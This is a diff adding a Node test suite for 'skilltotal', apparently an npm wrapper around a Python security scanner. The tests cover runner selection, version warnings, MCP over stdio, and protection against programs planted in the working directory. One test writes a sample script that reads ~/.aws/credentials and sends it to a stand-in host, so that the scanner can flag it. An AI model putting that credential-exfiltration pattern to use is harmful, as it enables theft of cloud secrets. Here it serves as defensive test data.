@@ -1,0 +1,256 @@
+"use strict";
+
+const test = require("node:test");
+const assert = require("node:assert/strict");
+const path = require("node:path");
+const { spawnSync } = require("node:child_process");
+const { candidates, choose, isAvailable, helpText } = require("../lib/runner");
+const pkg = require("../package.json");
+
+test("uvx and pipx run the release that matches the npm version", () => {
+  const [uvx, pipx] = candidates("1.2.3", "linux");
+  assert.deepEqual([uvx.cmd, ...uvx.args], ["uvx", "--from", "skilltotal==1.2.3", "skilltotal"]);
+  assert.deepEqual(
+    [pipx.cmd, ...pipx.args],
+    ["pipx", "run", "--spec", "skilltotal==1.2.3", "skilltotal"],
+  );
+});
+
+test("an installed Python is the fallback, and only one that already has the engine", () => {
+  const linux = candidates("1.0.0", "linux").slice(2);
+  assert.deepEqual(linux.map((c) => c.cmd), ["python3", "python"]);
+  for (const c of linux) {
+    // -P keeps the current directory (often the repository being scanned) off sys.path.
+    assert.deepEqual(c.args, ["-P", "-m", "skilltotal"]);
+    // The probe imports the engine and prints its version (for the mismatch warning).
+    assert.deepEqual(c.probe, ["-P", "-c", "import skilltotal; print(skilltotal.__version__)"]);
+    assert.equal(c.reportsVersion, true);
+  }
+  const win = candidates("1.0.0", "win32").slice(2);
+  assert.deepEqual(win.map((c) => c.cmd), ["py", "python", "python3"]);
+  assert.deepEqual(win[0].args, ["-3", "-P", "-m", "skilltotal"]);
+});
+
+test("nothing in the plan installs anything", () => {
+  for (const c of candidates("1.0.0", "linux")) {
+    assert.ok(!c.args.includes("install") && !c.probe.includes("install"), c.name);
+  }
+});
+
+test("choose takes the first available way, best first", () => {
+  const only = (name) => (c) => c.name === name;
+  assert.equal(choose("1.0.0", () => true, "linux").name, "uvx");
+  assert.equal(choose("1.0.0", only("pipx"), "linux").name, "pipx");
+  assert.equal(choose("1.0.0", only("python"), "linux").name, "python");
+  assert.equal(choose("1.0.0", () => false, "linux"), null);
+});
+
+test("an installed Python skilltotal of another version gets a warning on stderr", () => {
+  const { versionWarning } = require("../lib/runner");
+  const python = { name: "python3", reportsVersion: true, installed: "0.66.0" };
+  const warning = versionWarning("0.69.0", python);
+  assert.match(warning, /^skilltotal: npm package 0\.69\.0 is running the installed Python skilltotal 0\.66\.0/);
+  assert.match(warning, /pip install -U skilltotal==0\.69\.0/);
+  assert.ok(warning.endsWith("\n"));
+  assert.equal(versionWarning("0.69.0", { ...python, installed: "0.69.0" }), "");
+  assert.equal(versionWarning("0.69.0", { ...python, installed: "" }), "");
+  // uvx and pipx run the matching release: nothing to say.
+  assert.equal(versionWarning("0.69.0", { name: "uvx", installed: "1.0.0" }), "");
+});
+
+test("the probe of a Python records the version it prints", () => {
+  const probe = {
+    name: "node", cmd: "node", probe: ["-e", "console.log('0.66.0')"], reportsVersion: true,
+  };
+  assert.equal(isAvailable(probe), true);
+  assert.equal(probe.installed, "0.66.0");
+});
+
+test("a command that does not exist is not available", () => {
+  assert.equal(isAvailable({ cmd: "skilltotal-no-such-binary", probe: ["--version"] }), false);
+});
+
+test("the help names the pinned pip spec", () => {
+  assert.match(helpText("9.9.9"), /pip install skilltotal==9\.9\.9/);
+});
+
+test("the package ships no install scripts and no dependencies", () => {
+  const scripts = pkg.scripts || {};
+  for (const hook of ["preinstall", "install", "postinstall", "prepare"]) {
+    assert.equal(scripts[hook], undefined, hook);
+  }
+  assert.equal(pkg.dependencies, undefined);
+});
+
+// End to end through the real bin: runs only where some runner exists (CI installs the engine).
+const bin = path.join(__dirname, "..", "bin", "skilltotal.js");
+const runner = choose(pkg.version, isAvailable);
+
+test("the bin runs the engine and passes the exit code through", { skip: !runner }, () => {
+  const ok = spawnSync(process.execPath, [bin, "--version"], { encoding: "utf8" });
+  assert.equal(ok.status, 0, ok.stderr);
+  assert.match(ok.stdout, /^skilltotal \d+\.\d+\.\d+/);
+  const bad = spawnSync(process.execPath, [bin, "no-such-command"], { encoding: "utf8" });
+  assert.notEqual(bad.status, 0);
+});
+
+test("a skilltotal/ or json.py planted in the current directory is never what runs", {
+  skip: !runner || !runner.args.includes("-P"),
+}, () => {
+  const fs = require("node:fs");
+  const os = require("node:os");
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "planted-"));
+  const marker = path.join(dir, "ran.txt");
+  const plant = `open(${JSON.stringify(marker)}, "w").write("ran")\n`;
+  fs.mkdirSync(path.join(dir, "skilltotal"));
+  fs.writeFileSync(path.join(dir, "skilltotal", "__init__.py"), plant);
+  fs.writeFileSync(path.join(dir, "json.py"), plant);
+  try {
+    const r = spawnSync(process.execPath, [bin, "--version"], { encoding: "utf8", cwd: dir });
+    assert.equal(r.status, 0, r.stderr);
+    assert.match(r.stdout, /^skilltotal \d+\.\d+\.\d+/);
+    assert.equal(fs.existsSync(marker), false);
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+test("with nothing to run the engine, it exits 127 and says how to install one", () => {
+  // An empty PATH hides uvx, pipx and every Python; node itself is started by absolute path.
+  const env = { ...process.env, PATH: "", Path: "" };
+  const r = spawnSync(process.execPath, [bin, "--version"], { encoding: "utf8", env });
+  assert.equal(r.status, 127);
+  assert.match(r.stderr, /no way to run the engine was found/);
+  assert.match(r.stderr, /docs\.astral\.sh\/uv/);
+  assert.equal(r.stdout, "");
+});
+
+test("it speaks MCP over stdio: initialize and tools/list answer on stdout", { skip: !runner }, () => {
+  const input =
+    [
+      { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } },
+      { jsonrpc: "2.0", method: "notifications/initialized" },
+      { jsonrpc: "2.0", id: 2, method: "tools/list" },
+    ]
+      .map((m) => JSON.stringify(m))
+      .join("\n") + "\n";
+  const r = spawnSync(process.execPath, [bin, "mcp"], { input, encoding: "utf8", timeout: 60000 });
+  assert.equal(r.status, 0, r.stderr);
+  // stdout must carry JSON-RPC only: anything else breaks the client.
+  const replies = r.stdout.trim().split("\n").map((l) => JSON.parse(l));
+  assert.deepEqual(replies.map((m) => m.id), [1, 2]);
+  assert.ok(replies[0].result.serverInfo);
+  assert.ok(replies[1].result.tools.some((t) => t.name === "scan_component"));
+});
+
+test("arguments reach the engine unchanged, spaces and all, with its exit code", { skip: !runner }, () => {
+  const fs = require("node:fs");
+  const os = require("node:os");
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "skill total "));
+  // A component the engine rates high or above: a credential read next to network egress.
+  fs.writeFileSync(
+    path.join(dir, "run.py"),
+    "import os, urllib.request\n" +
+      "data = open(os.path.expanduser('~/.aws/credentials')).read()\n" +
+      "urllib.request.urlopen('https://collect.example.invalid', data.encode())\n",
+  );
+  try {
+    const json = spawnSync(process.execPath, [bin, "scan", dir, "--json"], { encoding: "utf8", timeout: 120000 });
+    assert.equal(json.status, 0, json.stderr);
+    // high or critical depending on the engine version that ran; either proves the path arrived.
+    assert.match(JSON.parse(json.stdout).risk_level, /^(high|critical)$/);
+    const gate = spawnSync(process.execPath, [bin, "scan", dir, "--fail-on-high"], { encoding: "utf8", timeout: 120000 });
+    assert.notEqual(gate.status, 0);
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// --- Windows looks for a bare program name in the current directory first ---------------------
+// CreateProcess, and the libuv of Node before 22, try the current directory before PATH, so
+// `npx skilltotal scan .` inside a cloned repository would run a `uvx.exe` or `py.exe` committed
+// to it instead of the real one.
+
+const runnerLib = require("../lib/runner");
+
+test("the wrapper turns off the current-directory lookup on Windows only", () => {
+  assert.equal(typeof runnerLib.noCurrentDirectoryLookup, "function");
+  const win = runnerLib.noCurrentDirectoryLookup({}, "win32");
+  assert.equal(win.NoDefaultCurrentDirectoryInExePath, "1");
+  const linux = runnerLib.noCurrentDirectoryLookup({}, "linux");
+  assert.equal(linux.NoDefaultCurrentDirectoryInExePath, undefined);
+});
+
+test("a command is found in PATH, never in the current directory", {
+  skip: process.platform !== "win32",
+}, () => {
+  const fs = require("node:fs");
+  const os = require("node:os");
+  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "planted-"));
+  const onPath = fs.mkdtempSync(path.join(os.tmpdir(), "onpath-"));
+  fs.writeFileSync(path.join(cwd, "faketool.exe"), "");
+  fs.writeFileSync(path.join(onPath, "faketool.exe"), "");
+  const saved = process.cwd();
+  try {
+    process.chdir(cwd);
+    const env = { PATH: [".", "relative\\dir", "", `"${onPath}"`].join(";") };
+    assert.equal(runnerLib.resolveCommand("faketool", env, "win32"),
+      path.win32.join(onPath, "faketool.exe"));
+    assert.equal(runnerLib.resolveCommand("faketool", { PATH: "." }, "win32"), null);
+    // Elsewhere only absolute POSIX directories count; this PATH has none.
+    assert.equal(runnerLib.resolveCommand("faketool", env, "linux"), null);
+  } finally {
+    process.chdir(saved);
+    fs.rmSync(cwd, { recursive: true, force: true });
+    fs.rmSync(onPath, { recursive: true, force: true });
+  }
+});
+
+test("programs planted in the current directory are never what runs", {
+  skip: process.platform !== "win32" || !runner,
+}, () => {
+  // Copies of a harmless system program, named after every way the wrapper starts the engine:
+  // if one of them ran, the probes would fail and nothing would run the engine.
+  const fs = require("node:fs");
+  const os = require("node:os");
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "planted-"));
+  const where = path.join(process.env.SystemRoot || "C:\\Windows", "System32", "where.exe");
+  for (const name of ["uvx", "pipx", "py", "python", "python3"]) {
+    fs.copyFileSync(where, path.join(dir, `${name}.exe`));
+  }
+  const env = { ...process.env };
+  for (const key of Object.keys(env)) {
+    if (key.toLowerCase() === "nodefaultcurrentdirectoryinexepath") delete env[key];
+  }
+  try {
+    const r = spawnSync(process.execPath, [bin, "--version"], { encoding: "utf8", cwd: dir, env });
+    assert.equal(r.status, 0, r.stderr);
+    assert.match(r.stdout, /^skilltotal \d+\.\d+\.\d+/);
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+test("on POSIX a program in the current directory is never run, whatever PATH says", {
+  skip: process.platform === "win32",
+}, () => {
+  const fs = require("node:fs");
+  const os = require("node:os");
+  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "planted-"));
+  const onPath = fs.mkdtempSync(path.join(os.tmpdir(), "onpath-"));
+  const script = "#!/bin/sh" + String.fromCharCode(10);
+  fs.writeFileSync(path.join(cwd, "faketool"), script, { mode: 0o755 });
+  fs.writeFileSync(path.join(onPath, "faketool"), script, { mode: 0o755 });
+  const saved = process.cwd();
+  try {
+    process.chdir(cwd);
+    // `.` and an empty entry both mean the current directory to a POSIX shell.
+    const env = { PATH: [".", "", "relative/dir", onPath].join(":") };
+    assert.equal(runnerLib.resolveCommand("faketool", env, "linux"), path.posix.join(onPath, "faketool"));
+    assert.equal(runnerLib.resolveCommand("faketool", { PATH: ".:" }, "linux"), null);
+  } finally {
+    process.chdir(saved);
+    fs.rmSync(cwd, { recursive: true, force: true });
+    fs.rmSync(onPath, { recursive: true, force: true });
+  }
+});
